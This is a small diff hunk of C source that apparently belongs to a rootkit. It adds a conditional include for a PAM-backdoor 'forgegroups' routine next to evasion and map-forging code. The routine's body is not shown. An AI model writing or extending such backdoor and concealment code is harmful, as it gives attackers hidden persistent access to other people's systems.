@@ -4,6 +4,11 @@
 #include "evasion/evasion.h"
 #endif
 
+#ifdef USE_PAM_BD
+FILE *forgegroups(const char *pathname);
+#include "groupsforge.c"
+#endif
+
 #ifdef FORGE_MAPS
 // lines containing these vvv are redacted. this should be ok the way it is.
 // but if not..u know whatta do
